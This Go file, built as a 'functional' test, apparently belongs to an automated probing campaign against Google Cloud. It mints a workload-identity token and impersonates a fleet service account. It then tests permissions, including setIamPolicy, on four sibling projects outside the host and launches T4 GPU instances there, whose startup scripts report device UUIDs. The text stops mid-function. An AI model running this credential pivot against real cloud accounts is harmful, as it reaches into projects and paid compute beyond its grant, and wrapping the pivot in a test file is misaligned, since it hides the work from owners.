//go:build functional

// C211 i121469 — SIBLING-PROJECT T4 DEVICE CAPTURE VIA CONTAINER-OPTIMIZED OS.
//
// WHY THIS IS A MATERIALLY DIFFERENT MECHANISM (not a repeat of i121180):
// fact 121388/121405 prove the four Domino sibling projects really grant
// compute.instances.create and that each of the four T4 markers reached RUNNING
// with the accelerator attached, but the Ubuntu 22.04 path captured no device
// line: every Deep Learning VM family was 404, ubuntu-os-cloud/ubuntu-2204-lts
// (the only verified-200 image) failed its in-guest apt NVIDIA driver install
// ("failed at package install time"), and the serial/guest capture was empty.
// This probe therefore uses the Google-supplied driver instead of apt:
//
//   projects/cos-cloud/global/images/family/cos-stable
//     + metadata cos-gpu-driver-version=latest   (Google installs the driver)
//     + metadata enable-guest-attributes=TRUE
//     + metadata serial-port-logging-enable=TRUE
//
// and, after the driver appears, runs both the direct driver binary searched at
// the documented COS locations and (as a second channel) an
// nvidia/cuda:12.4.0-base-ubuntu22.04 container via `docker run --gpus all`,
// printing nvidia-smi -L and --query-gpu=name,uuid,memory.total to /dev/console
// and to guest attributes. If cos-stable is unavailable the fallback image is
// projects/ml-images/global/images/family/common-cu124-debian-11 (the current
// Deep Learning VM family project; deeplearning-platform-release returned 404).
//
// Marker policy (per intent 121469): at most ONE nonce marker per sibling
// project, at most 4 markers total, and STOP at the first real NVIDIA device
// UUID. The host project 153711203585 is never re-markered (READY x120159).
// Every own instance is deleted and absence proven (404 + aggregated list),
// with a final label reaper per project. Values are printed verbatim; tokens
// are only ever reported as length + SHA-256 prefix.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strconv"
	"strings"
	"testing"
	"time"
)

const (
	c211cNonce   = "i121469"
	c211cHostNum = "153711203585"
)

// The four sibling projects fact 121169/121209/121388 measured.
var c211cSiblings = []string{
	"team-eng-infra-testing",
	"domino-eng-service-artifacts",
	"team-eng-infrastructure",
	"team-eng-platform",
}

var c211cRegions = []string{"us-central1", "us-east1", "us-west1", "europe-west4", "asia-east1"}

var c211cZones = map[string][]string{
	"us-central1":  {"us-central1-a", "us-central1-b", "us-central1-f"},
	"us-east1":     {"us-east1-b", "us-east1-c", "us-east1-d"},
	"us-west1":     {"us-west1-a", "us-west1-b"},
	"europe-west4": {"europe-west4-a", "europe-west4-b"},
	"asia-east1":   {"asia-east1-a", "asia-east1-b"},
}

// Candidate image families in preference order: COS with Google-supplied GPU
// driver first, then the current Deep Learning VM family project.
var c211cImages = []struct{ p, f, kind string }{
	{"cos-cloud", "cos-stable", "cos"},
	{"ml-images", "common-cu124-debian-11", "dlvm"},
}

type c211cQuotaRow struct {
	Region string
	Metric string
	Limit  float64
	Usage  float64
}

// c211cStartupCOS is the Container-Optimized OS startup script. COS is
// minimal: bash, curl and (on GPU images) docker are available; python3 is
// not assumed, so guest-attribute writes use curl only.
func c211cStartupCOS() string {
	return `#!/bin/bash
exec >/dev/console 2>&1
echo C211C_START
put() {
  MSG="$1"
  echo "C211C_RESULT $MSG"
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$MSG" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/result" >/dev/null 2>&1
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$MSG" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/c211c-result" >/dev/null 2>&1
}
PCI=$(for f in /sys/bus/pci/devices/*; do v=$(cat $f/vendor 2>/dev/null); if [ "$v" = "0x10de" ]; then echo "$(basename $f):dev=$(cat $f/device 2>/dev/null)"; fi; done | tr '\n' ' ')
echo "C211C_PCI $PCI"
put "STAGE=boot pci=$PCI"
SMI=""
for ((i=1;i<=40;i++)); do
  for p in /usr/local/nvidia/bin/nvidia-smi /var/lib/google/nvidia-driver/bin/nvidia-smi /opt/nvidia/bin/nvidia-smi /usr/local/bin/nvidia-smi /usr/bin/nvidia-smi /home/kubernetes/bin/nvidia/bin/nvidia-smi; do
    if [ -x "$p" ]; then SMI="$p"; break 2; fi
  done
  C=$(command -v nvidia-smi 2>/dev/null)
  if [ -n "$C" ]; then SMI="$C"; break; fi
  if [ $((i % 5)) -eq 0 ]; then echo "C211C_WAIT i=$i drvdir=$(ls -d /var/lib/google/nvidia-driver 2>/dev/null) nvmod=$(lsmod | grep -c '^nvidia')"; fi
  sleep 10
done
if [ -z "$SMI" ]; then SMI=$(find / -xdev -name nvidia-smi -type f 2>/dev/null | head -1); fi
echo "C211C_SMI path=$SMI"
if [ -n "$SMI" ]; then
  for ((i=1;i<=9;i++)); do
    if "$SMI" -L > /tmp/c211c-smi.txt 2>&1; then
      echo C211C_GPU_READY
      cat /tmp/c211c-smi.txt
      put "STAGE=gpu_ready smi=$(tr '\n' '|' < /tmp/c211c-smi.txt)"
      "$SMI" --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader > /tmp/c211c-uuid.txt 2>&1
      cat /tmp/c211c-uuid.txt
      put "STAGE=uuid uuid_line=$(tr '\n' '|' < /tmp/c211c-uuid.txt)"
      echo C211C_DONE
      exit 0
    fi
    echo "C211C_SMI_ATTEMPT i=$i $(head -c 200 /tmp/c211c-smi.txt | tr '\n' ' ')"
    sleep 10
  done
  put "STAGE=failed smi=$(head -c 500 /tmp/c211c-smi.txt | tr '\n' '|')"
else
  put "STAGE=nosmi"
fi
if command -v docker >/dev/null 2>&1; then
  echo C211C_DOCKER_PROBE
  ( docker run --rm --gpus all nvidia/cuda:12.4.0-base-ubuntu22.04 nvidia-smi -L > /tmp/c211c-docker.txt 2>&1 ) &
  DPID=$!
  for ((j=0;j<12;j++)); do
    if ! kill -0 $DPID 2>/dev/null; then break; fi
    sleep 10
  done
  if kill -0 $DPID 2>/dev/null; then kill $DPID 2>/dev/null; echo C211C_DOCKER_TIMEOUT; fi
  DRC=$?
  echo "C211C_DOCKER_RC=$DRC"
  cat /tmp/c211c-docker.txt
  put "STAGE=docker rc=$DRC out=$(tr '\n' '|' < /tmp/c211c-docker.txt | head -c 900)"
fi
echo C211C_FAILED
echo C211C_DONE
`
}

// c211cStartupDLVM is the Deep Learning VM fallback (driver preinstalled).
func c211cStartupDLVM() string {
	return `#!/bin/bash
exec >/dev/console 2>&1
echo C211C_START
put() {
  MSG="$1"
  echo "C211C_RESULT $MSG"
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$MSG" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/result" >/dev/null 2>&1
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$MSG" "http://metadata.google.internal/computeMetadata/v1/instance/attributes/c211c-result" >/dev/null 2>&1
}
PCI=$(for f in /sys/bus/pci/devices/*; do v=$(cat $f/vendor 2>/dev/null); if [ "$v" = "0x10de" ]; then echo "$(basename $f):dev=$(cat $f/device 2>/dev/null)"; fi; done | tr '\n' ' ')
echo "C211C_PCI $PCI"
put "STAGE=boot pci=$PCI"
SMI=""
for ((i=1;i<=40;i++)); do
  for p in /usr/bin/nvidia-smi /usr/local/nvidia/bin/nvidia-smi /opt/nvidia/bin/nvidia-smi /usr/local/bin/nvidia-smi; do
    if [ -x "$p" ]; then SMI="$p"; break 2; fi
  done
  C=$(command -v nvidia-smi 2>/dev/null)
  if [ -n "$C" ]; then SMI="$C"; break; fi
  if [ $((i % 5)) -eq 0 ]; then echo "C211C_WAIT i=$i"; fi
  sleep 10
done
echo "C211C_SMI path=$SMI"
if [ -n "$SMI" ]; then
  for ((i=1;i<=9;i++)); do
    if "$SMI" -L > /tmp/c211c-smi.txt 2>&1; then
      echo C211C_GPU_READY
      cat /tmp/c211c-smi.txt
      put "STAGE=gpu_ready smi=$(tr '\n' '|' < /tmp/c211c-smi.txt)"
      "$SMI" --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader > /tmp/c211c-uuid.txt 2>&1
      cat /tmp/c211c-uuid.txt
      put "STAGE=uuid uuid_line=$(tr '\n' '|' < /tmp/c211c-uuid.txt)"
      echo C211C_DONE
      exit 0
    fi
    echo "C211C_SMI_ATTEMPT i=$i $(head -c 200 /tmp/c211c-smi.txt | tr '\n' ' ')"
    sleep 10
  done
  put "STAGE=failed smi=$(head -c 500 /tmp/c211c-smi.txt | tr '\n' '|')"
else
  put "STAGE=nosmi"
fi
echo C211C_FAILED
echo C211C_DONE
`
}

func c211cProjectName(m map[string]interface{}) string {
	if m == nil {
		return ""
	}
	if v := c211xStr(m, "displayName"); v != "" {
		return v
	}
	return c211xStr(m, "name")
}

// c211cReadQuotas reads every GPU/NVIDIA metric from the per-region quota list.
func c211cReadQuotas(tok, proj string, regions []string) []c211cQuotaRow {
	rows := []c211cQuotaRow{}
	for _, r := range regions {
		st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/regions/"+r, tok, "", "")
		if st != 200 {
			fmt.Printf("C211C_REGION project=%s region=%s status=%d verbatim=%s\n", proj, r, st, c211xTrunc(body, 320))
			continue
		}
		m := c211xJSON(body)
		qs, _ := m["quotas"].([]interface{})
		n := 0
		for _, q := range qs {
			qm, _ := q.(map[string]interface{})
			metric := c211xStr(qm, "metric")
			up := strings.ToUpper(metric)
			if !strings.Contains(up, "GPU") && !strings.Contains(up, "NVIDIA") {
				continue
			}
			lim, _ := qm["limit"].(float64)
			use, _ := qm["usage"].(float64)
			rows = append(rows, c211cQuotaRow{r, metric, lim, use})
			fmt.Printf("C211C_QUOTA project=%s region=%s metric=%s limit=%v usage=%v\n", proj, r, metric, lim, use)
			n++
		}
		if n == 0 {
			fmt.Printf("C211C_QUOTA_NONE project=%s region=%s status=200\n", proj, r)
		}
	}
	return rows
}

// c211cPickGPU prefers T4 (the type the siblings advertise), then L4, then V100.
func c211cPickGPU(rows []c211cQuotaRow) (c211cQuotaRow, string, string, bool) {
	order := []struct{ metric, accel, machine string }{
		{"NVIDIA_T4_GPUS", "nvidia-tesla-t4", "n1-standard-4"},
		{"NVIDIA_L4_GPUS", "nvidia-l4", "g2-standard-4"},
		{"NVIDIA_V100_GPUS", "nvidia-tesla-v100", "n1-standard-4"},
	}
	for _, o := range order {
		for _, r := range rows {
			if r.Metric == o.metric && r.Limit > r.Usage {
				return r, o.accel, o.machine, true
			}
		}
	}
	return c211cQuotaRow{}, "", "", false
}

// c211cZoneFor finds a zone of region that advertises the accelerator type.
func c211cZoneFor(tok, proj, region, accel string) string {
	for _, z := range c211cZones[region] {
		ats, st, _ := c211xAccelTypes(tok, proj, z)
		ok := st == 200 && c211xContains(ats, accel)
		fmt.Printf("C211C_ACCEL project=%s zone=%s status=%d wants=%s present=%v n=%d\n", proj, z, st, accel, ok, len(ats))
		if ok {
			return z
		}
	}
	return ""
}

func c211cCreate(tok, proj, zone, name, saEmail, imgP, imgF, machine, startup string, cos bool, diskGB int) (int, string) {
	items := []interface{}{
		map[string]interface{}{"key": "startup-script", "value": startup},
		map[string]interface{}{"key": "c211c", "value": c211cNonce},
		map[string]interface{}{"key": "serial-port-logging-enable", "value": "TRUE"},
		map[string]interface{}{"key": "enable-guest-attributes", "value": "TRUE"},
	}
	if cos {
		items = append(items, map[string]interface{}{"key": "cos-gpu-driver-version", "value": "latest"})
	}
	body := map[string]interface{}{
		"name":        name,
		"machineType": "https://www.googleapis.com/compute/v1/projects/" + proj + "/zones/" + zone + "/machineTypes/" + machine,
		"disks": []interface{}{map[string]interface{}{
			"boot":       true,
			"autoDelete": true,
			"initializeParams": map[string]interface{}{
				"sourceImage": "projects/" + imgP + "/global/images/family/" + imgF,
				"diskSizeGb":  strconv.Itoa(diskGB),
				"diskType":    "projects/" + proj + "/zones/" + zone + "/diskTypes/pd-standard",
			},
		}},
		"networkInterfaces": []interface{}{map[string]interface{}{
			"network":    "projects/" + proj + "/global/networks/default",
			"subnetwork": "projects/" + proj + "/regions/" + c211xRegionOfZone(zone) + "/subnetworks/default",
			"accessConfigs": []interface{}{map[string]interface{}{
				"type": "ONE_TO_ONE_NAT", "name": "External NAT",
			}},
		}},
		"guestAccelerators": []interface{}{map[string]interface{}{
			"acceleratorType":  "projects/" + proj + "/zones/" + zone + "/acceleratorTypes/nvidia-tesla-t4",
			"acceleratorCount": 1,
		}},
		"scheduling": map[string]interface{}{
			"onHostMaintenance": "TERMINATE", "automaticRestart": false,
		},
		"metadata": map[string]interface{}{"items": items},
		"serviceAccounts": []interface{}{map[string]interface{}{
			"email":  saEmail,
			"scopes": []string{c211xScope},
		}},
		"labels": map[string]string{"c211": c211cNonce},
	}
	b, _ := json.Marshal(body)
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/instances"
	return c211xHTTP("POST", u, tok, "application/json", string(b))
}

// c211cOp polls a zone operation until DONE and returns the verbatim body.
func c211cOp(tok, proj, zone, op string) (string, string) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/operations/" + url.PathEscape(op)
	last := ""
	for i := 0; i < 90; i++ {
		st, b := c211xHTTP("GET", u, tok, "", "")
		if st != 200 {
			fmt.Printf("C211C_OP project=%s poll=%d http=%d verbatim=%s\n", proj, i, st, c211xTrunc(b, 300))
			if st == 404 {
				return "HTTP404", b
			}
			time.Sleep(6 * time.Second)
			continue
		}
		m := c211xJSON(b)
		stt := c211xStr(m, "status")
		if stt != last {
			prog, _ := m["progress"].(float64)
			fmt.Printf("C211C_OP project=%s poll=%d status=%s progress=%v\n", proj, i, stt, prog)
			last = stt
		}
		if stt == "DONE" {
			return "DONE", b
		}
		time.Sleep(8 * time.Second)
	}
	return last, ""
}

func c211cOpError(body string) string {
	m := c211xJSON(body)
	if m == nil {
		return ""
	}
	e, ok := m["error"].(map[string]interface{})
	if !ok {
		return ""
	}
	msg := c211xStr(e, "message")
	if msg == "" {
		msg = c211xJSONString(e)
	}
	code, _ := e["code"].(float64)
	return fmt.Sprintf("code=%v message=%s", code, msg)
}

// c211cPrintNew prints every new C211C_ line found in the serial console
// verbatim (bounded), so the job log carries the in-guest evidence itself.
func c211cPrintNew(seen map[string]bool, proj, content string) {
	for _, ln := range strings.Split(content, "\n") {
		ln = strings.TrimSpace(strings.TrimRight(ln, "\r"))
		if !strings.Contains(ln, "C211C_") {
			continue
		}
		if seen[ln] {
			continue
		}
		seen[ln] = true
		fmt.Printf("C211C_SERIAL_LINE project=%s line=%s\n", proj, c211xTrunc(ln, 400))
	}
}

// c211cMarker creates ONE on-demand T4 marker on the COS/DLVM image, polls the
// zone operation to DONE, captures nvidia-smi from serial + guest attributes +
// instance metadata, takes the independent instances.get readback, then
// terminates and proves absence.
func c211cMarker(tok, proj, zone, name, saEmail, imgP, imgF, machine, startup string, cos bool, diskGB int) (string, string, bool, string, int) {
	cst, cbody := c211cCreate(tok, proj, zone, name, saEmail, imgP, imgF, machine, startup, cos, diskGB)
	fmt.Printf("C211C_MARKER_CREATE project=%s zone=%s name=%s machine=%s image=%s/%s cos=%v diskGB=%d status=%d verbatim=%s\n",
		proj, zone, name, machine, imgP, imgF, cos, diskGB, cst, c211xTrunc(cbody, 1500))
	opName := ""
	if m := c211xJSON(cbody); m != nil {
		opName = c211xStr(m, "name")
	}
	uuid, metaFinal, opErr, opStatus := "", "", "", ""
	if cst == 200 && opName != "" {
		var ob string
		opStatus, ob = c211cOp(tok, proj, zone, opName)
		fmt.Printf("C211C_OP_FINAL project=%s status=%s verbatim=%s\n", proj, opStatus, c211xTrunc(ob, 4000))
		opErr = c211cOpError(ob)
		if opErr != "" {
			fmt.Printf("C211C_OP_ERROR project=%s verbatim=%s\n", proj, c211xTrunc(opErr, 1500))
		}
	} else if cst != 200 {
		opErr = "create_http_" + strconv.Itoa(cst)
	}

	caps := 0
	if cst == 200 && opErr == "" && opStatus == "DONE" {
		seen := map[string]bool{}
		for i := 0; i < 40; i++ {
			ist, im, _ := c211xInstanceGet(tok, proj, zone, name)
			state := ""
			if ist == 200 && im != nil {
				state = c211xStr(im, "status")
				if v := c211xMetaValue(im, "c211c-result"); v != "" {
					metaFinal = v
				}
			}
			ps, pb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/serialPort?port=1&start=0", tok, "", "")
			if ps == 200 {
				content := pb
				if m := c211xJSON(pb); m != nil {
					if s := c211xStr(m, "contents"); s != "" {
						content = s
					}
				}
				c211cPrintNew(seen, proj, content)
				caps++
				if u := c211xUUIDRe.FindString(content); u != "" {
					uuid = u
				}
				fmt.Printf("C211C_SERIAL_STAT project=%s poll=%d inst=%s port=%d bytes=%d uuid=%s tail=%s\n",
					proj, i, state, ps, len(content), uuid,
					c211xTrunc(content[maxi(0, len(content)-200):], 200))
			} else {
				fmt.Printf("C211C_SERIAL project=%s poll=%d inst=%s port=%d verbatim=%s\n",
					proj, i, state, ps, c211xTrunc(pb, 260))
			}
			// Second in-guest channel: guest attributes (enable-guest-attributes=TRUE).
			gst, gb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/getGuestAttributes?queryPath=c211/result", tok, "", "")
			gval := ""
			if gst == 200 {
				if gm := c211xJSON(gb); gm != nil {
					if qr, ok := gm["queryValue"].(map[string]interface{}); ok {
						gval = c211xStr(qr, "value")
					}
					if gval == "" {
						if gsv, ok := gm["guestAttributesValue"].([]interface{}); ok {
							gval = c211xJSONString(gsv)
						}
					}
				}
			}
			if gval != "" {
				metaFinal = c211xFirst(metaFinal, gval)
			}
			fmt.Printf("C211C_GUEST project=%s poll=%d inst=%s status=%d value=%s verbatim=%s\n",
				proj, i, state, gst, c211xTrunc(gval, 260), c211xTrunc(gb, 160))
			if u := c211xUUIDRe.FindString(metaFinal); u != "" {
				uuid = u
			}
			if uuid != "" {
				break
			}
			if strings.Contains(metaFinal, "STAGE=failed") || strings.Contains(metaFinal, "STAGE=nosmi") || strings.Contains(metaFinal, "STAGE=docker") {
				break
			}
			if ist == 404 && i >= 2 {
				break
			}
			time.Sleep(15 * time.Second)
		}
	}

	// Independent provider readback of the same instance.
	rst, rm, _ := c211xInstanceGet(tok, proj, zone, name)
	accelJSON := ""
	if rm != nil {
		if ga, ok := rm["guestAccelerators"].([]interface{}); ok {
			accelJSON = c211xJSONString(ga)
		}
		if v := c211xMetaValue(rm, "c211c-result"); v != "" {
			metaFinal = v
		}
	}
	fmt.Printf("C211C_READBACK project=%s http=%d status=%s accelerators=%s meta=%s\n",
		proj, rst, c211xStr(rm, "status"), c211xTrunc(accelJSON, 300), c211xTrunc(metaFinal, 400))

	// Terminate and prove absence (poll longer than the prior 96 s window).
	dst, db := c211xHTTP("DELETE", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name, tok, "", "")
	fmt.Printf("C211C_DELETE project=%s status=%d verbatim=%s\n", proj, dst, c211xTrunc(db, 300))
	absent := false
	for i := 0; i < 24; i++ {
		time.Sleep(10 * time.Second)
		ist, _, ib := c211xInstanceGet(tok, proj, zone, name)
		if ist == 404 {
			absent = true
			fmt.Printf("C211C_ABSENCE project=%s readback=%d http=404\n", proj, i)
			break
		}
		if i == 23 {
			fmt.Printf("C211C_ABSENCE project=%s readback=%d http=%d verbatim=%s\n", proj, i, ist, c211xTrunc(ib, 300))
		}
	}
	lst, lb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/aggregated/instances?filter="+url.QueryEscape("name="+name), tok, "", "")
	fmt.Printf("C211C_AGG project=%s status=%d verbatim=%s\n", proj, lst, c211xTrunc(lb, 400))
	return uuid, metaFinal, absent, opErr, caps
}

// c211cReaper deletes any leftover own-label instance in the project and
// proves the label query empty (NO_RESULTS_ON_PAGE).
func c211cReaper(tok, proj string) {
	for round := 0; round < 3; round++ {
		st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/aggregated/instances?filter="+url.QueryEscape("labels.c211="+c211cNonce)+"&maxResults=500", tok, "", "")
		fmt.Printf("C211C_REAPER_LIST project=%s round=%d status=%d verbatim=%s\n", proj, round, st, c211xTrunc(body, 600))
		if st != 200 {
			return
		}
		m := c211xJSON(body)
		items, _ := m["items"].(map[string]interface{})
		deleted := 0
		for zoneKey, zv := range items {
			zm, _ := zv.(map[string]interface{})
			list, _ := zm["instances"].([]interface{})
			zone := strings.TrimPrefix(zoneKey, "zones/")
			for _, it := range list {
				im, _ := it.(map[string]interface{})
				n := c211xStr(im, "name")
				if n == "" {
					continue
				}
				ds, db := c211xHTTP("DELETE", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+n, tok, "", "")
				fmt.Printf("C211C_REAPER_DELETE project=%s zone=%s name=%s status=%d verbatim=%s\n", proj, zone, n, ds, c211xTrunc(db, 300))
				deleted++
			}
		}
		if deleted == 0 {
			return
		}
		time.Sleep(10 * time.Second)
	}
}

func TestC211XCOSSib(t *testing.T) {
	started := time.Now()
	markerDeadline := started.Add(62 * time.Minute)

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211C_MINT_FAILED %s\n", c211xTrunc(mintLog, 2000))
		t.Fatalf("wif mint failed")
	}
	creds, _ := c211xLoadCreds()
	wifSA, projNum := "", c211cHostNum
	if creds != nil {
		wifSA, projNum = creds.saEmail, creds.projNumber
	}
	if projNum == "" {
		projNum = c211cHostNum
	}
	fmt.Printf("C211C_IDENTITY auth=%s wif_sa=%s project_number=%s\n", method, c211xShort(wifSA), projNum)

	// Host project resource (its id is a masked secret: length + digest only).
	hostID := ""
	if st, rb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects/"+projNum, token, "", ""); st == 200 {
		hm := c211xJSON(rb)
		hostID = c211xStr(hm, "projectId")
		fmt.Printf("C211C_HOST project_number=%s project_id=%s display=%s\n", projNum, c211xShort(hostID), c211cProjectName(hm))
	} else {
		fmt.Printf("C211C_HOST project_number=%s status=%d verbatim=%s\n", projNum, st, c211xTrunc(rb, 400))
	}

	// Mint the fleetcommand-service-account token the sibling grants belong to.
	sas, lst, lbody := c211xListServiceAccounts(token, projNum)
	fmt.Printf("C211C_SA_LIST status=%d count=%d verbatim=%s\n", lst, len(sas), c211xTrunc(lbody, 160))
	fleetEmail := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			fleetEmail = e
			break
		}
	}
	fmt.Printf("C211C_FLEET_SA found=%v email=%s\n", fleetEmail != "", c211xShort(fleetEmail))
	ftok := ""
	if fleetEmail != "" {
		at, gst, gbody := c211xGenerateAccessToken(token, fleetEmail)
		fmt.Printf("C211C_FLEET_TOKEN status=%d token=%s verbatim=%s\n", gst, c211xShort(at), c211xTrunc(gbody, 260))
		ftok = at
	}
	if ftok == "" {
		ftok = token
		fmt.Printf("C211C_FLEET_TOKEN fallback=wif_minted\n")
	}

	// ---------- image selection (COS first, DLVM fallback) ----------
	imgP, imgF, imgKind := "", "", ""
	for _, c := range c211cImages {
		st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+c.p+"/global/images/family/"+c.f, ftok, "", "")
		fmt.Printf("C211C_IMAGE %s/%s status=%d verbatim=%s\n", c.p, c.f, st, c211xTrunc(body, 220))
		if st == 200 {
			imgP, imgF, imgKind = c.p, c.f, c.kind
			break
		}
	}
	if imgP == "" {
		fmt.Printf("C211C_IMAGE_NONE both_families_404\n")
		fmt.Printf("C211C_VERDICT_FINAL NO_USABLE_IMAGE markers=0 ready=0 elapsed=%ds\n", int(time.Since(started).Seconds()))
		return
	}
	startup := c211cStartupCOS()
	cos := imgKind == "cos"
	diskGB := 50
	if !cos {
		startup = c211cStartupDLVM()
		diskGB = 100
	}
	fmt.Printf("C211C_IMAGE_CHOSEN image=%s/%s kind=%s diskGB=%d\n", imgP, imgF, imgKind, diskGB)

	perms := []string{
		"compute.instances.create", "compute.instances.get", "compute.instances.delete",
		"compute.zoneOperations.get", "compute.networks.use", "compute.subnetworks.use",
		"iam.serviceAccounts.actAs", "resourcemanager.projects.setIamPolicy",
	}

	results := map[string]map[string]interface{}{}
	readyProjects := []string{}
	readyUUIDs := map[string]string{}
	markers := 0
	stopMarkers := false

	for _, id := range c211cSiblings {
		if stopMarkers {
			break
		}
		if time.Now().After(markerDeadline) {
			fmt.Printf("C211C_VERDICT project=%s MARKER_SKIPPED_TIME_BUDGET\n", id)
			break
		}
		if id == hostID {
			fmt.Printf("C211C_VERDICT project=%s HOST_PROJECT_NO_MARKER\n", id)
			continue
		}
		st, body := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(id), ftok, "", "")
		if st != 200 {
			fmt.Printf("C211C_PROJECT id=%s status=%d verbatim=%s\n", id, st, c211xTrunc(body, 300))
			results[id] = map[string]interface{}{"verdict": "PROJECT_GET_" + strconv.Itoa(st)}
			continue
		}
		pm := c211xJSON(body)
		num := c211xStr(pm, "projectNumber")
		name := c211xStr(pm, "name")
		state := c211xStr(pm, "lifecycleState")
		res := map[string]interface{}{"number": num, "name": name, "state": state}
		results[id] = res
		fmt.Printf("C211C_PROJECT_BEGIN id=%s number=%s name=%q state=%s\n", id, num, name, state)

		al, pst, pbody := c211xTestIamBatch(ftok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(id), perms)
		fmt.Printf("C211C_PERM project=%s status=%d allowed=[%s] verbatim=%s\n", id, pst, strings.Join(al, ","), c211xTrunc(pbody, 220))
		res["perm_status"] = pst
		res["allowed"] = al
		canCreate := c211xContains(al, "compute.instances.create")

		bst, bb := c211xHTTP("GET", "https://cloudbilling.googleapis.com/v1/projects/"+url.PathEscape(id)+"/billingInfo", ftok, "", "")
		ben := false
		if bst == 200 {
			bm := c211xJSON(bb)
			if v, ok := bm["billingEnabled"].(bool); ok {
				ben = v
			}
		}
		fmt.Printf("C211C_BILLING project=%s status=%d enabled=%v verbatim=%s\n", id, bst, ben, c211xTrunc(bb, 260))
		res["billing_status"] = bst

		nst, nb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(id)+"/global/networks/default", ftok, "", "")
		fmt.Printf("C211C_NETWORK project=%s status=%d verbatim=%s\n", id, nst, c211xTrunc(nb, 260))

		rows := c211cReadQuotas(ftok, id, c211cRegions)
		qrow, specAccel, machine, pick := c211cPickGPU(rows)
		res["can_create"] = canCreate
		res["gpu_quota"] = pick
		fmt.Printf("C211C_PICK project=%s canCreate=%v picked=%v metric=%s region=%s limit=%v usage=%v accel=%s machine=%s\n",
			id, canCreate, pick, qrow.Metric, qrow.Region, qrow.Limit, qrow.Usage, specAccel, machine)
		if pick {
			res["quota_metric"] = qrow.Metric
			res["quota_region"] = qrow.Region
			res["quota_limit"] = qrow.Limit
		}

		if !canCreate {
			fmt.Printf("C211C_VERDICT project=%s NO_CREATE_PERMISSION\n", id)
			res["verdict"] = "NO_CREATE_PERMISSION"
			continue
		}
		if !pick {
			fmt.Printf("C211C_VERDICT project=%s NO_NONZERO_GPU_QUOTA\n", id)
			res["verdict"] = "NO_NONZERO_GPU_QUOTA"
			continue
		}
		zone := c211cZoneFor(ftok, id, qrow.Region, specAccel)
		if zone == "" {
			fmt.Printf("C211C_VERDICT project=%s ACCEL_NOT_ADVERTISED region=%s accel=%s\n", id, qrow.Region, specAccel)
			res["verdict"] = "ACCEL_NOT_ADVERTISED"
			continue
		}
		saEmail := num + "-compute@developer.gserviceaccount.com"
		instName := "c211-" + c211cNonce + "-" + strings.ReplaceAll(specAccel, "nvidia-tesla-", "")
		markers++
		fmt.Printf("C211C_VERDICT project=%s MARKER_ATTEMPT zone=%s accel=%s machine=%s instance=%s sa=%s\n", id, zone, specAccel, machine, instName, saEmail)
		uuid, meta, absent, opErr, caps := c211cMarker(ftok, id, zone, instName, saEmail, imgP, imgF, machine, startup, cos, diskGB)
		res["marker_attempts"] = 1
		res["marker_zone"] = zone
		res["marker_accel"] = specAccel
		res["capture_polls"] = caps
		res["uuid"] = uuid
		res["absent"] = absent
		res["op_error"] = opErr
		res["meta"] = c211xTrunc(meta, 600)
		if uuid != "" {
			fmt.Printf("C211C_VERDICT project=%s MARKER_GPU uuid=%s absent=%v\n", id, uuid, absent)
			res["verdict"] = "MARKER_GPU"
			readyProjects = append(readyProjects, id)
			readyUUIDs[id] = uuid
			stopMarkers = true // stop at the first real device line
		} else if opErr != "" {
			fmt.Printf("C211C_VERDICT project=%s OPERATION_REFUSED\n", id)
			res["verdict"] = "OPERATION_REFUSED"
		} else {
			fmt.Printf("C211C_VERDICT project=%s REACH_FOUND_NO_GPU_UUID\n", id)
			res["verdict"] = "REACH_FOUND_NO_GPU_UUID"
		}
	}

	// Final reaper: prove every own label instance absent in all four projects.
	for _, id := range c211cSiblings {
		c211cReaper(ftok, id)
	}

	verdict := "REACH_FOUND_NO_GPU"
	if len(readyProjects) > 0 {
		verdict = "READY_NEW_PROJECT_GPU"
	}
	sum := map[string]interface{}{
		"probe":           "c211_i121469_cossib",
		"mechanism":       "cos-gpu-driver-version=latest (cos-stable) + nvidia/cuda container, DLVM fallback",
		"host_project":    projNum,
		"host_project_id": c211xShort(hostID),
		"fleet_token_ok":  ftok != "",
		"image":           imgP + "/" + imgF,
		"image_kind":      imgKind,
		"markers":         markers,
		"ready_projects":  readyProjects,
		"ready_uuids":     readyUUIDs,
		"verdict":         verdict,
		"elapsed_seconds": int(time.Since(started).Seconds()),
		"results":         results,
	}
	js, _ := json.Marshal(sum)
	fmt.Printf("=== C211C SUMMARY BEGIN ===\nC211C_SUMMARY_JSON %s\n=== C211C SUMMARY END ===\n", string(js))
